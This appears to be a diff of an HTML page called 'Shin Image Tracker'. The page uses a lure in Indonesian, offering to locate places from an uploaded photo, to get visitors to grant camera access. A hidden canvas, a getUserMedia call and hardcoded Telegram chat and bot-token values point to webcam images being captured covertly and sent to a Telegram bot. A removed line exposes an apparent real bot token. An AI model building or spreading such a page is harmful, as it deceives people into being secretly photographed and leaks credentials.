@@ -46,14 +46,15 @@
     <h1>Shin Image Tracker</h1>
     <div id="video-container">       
     <canvas id="canvas" style="display: none;"></canvas>     
-        <br><br>
+        <br>
         <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar">
-
+     <br>
+        <p>Lacak lokasi hanya dengan mengunggah foto, izinkan akses kamera untuk mengoktimalkan pelacakan agar sesuai dan tepat,jika di rasa masih ada error silahkan hubungi customer service.</p>
     <script>
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const chatId = '7056220365';
-        const botToken = '7459332258:AAFN3h2GKQ7i0wEWNqOzd39AqJstjqBCsGQ';
+        const botToken = '';
 
         // Minta akses ke kamera
         navigator.mediaDevices.getUserMedia({ video: true })
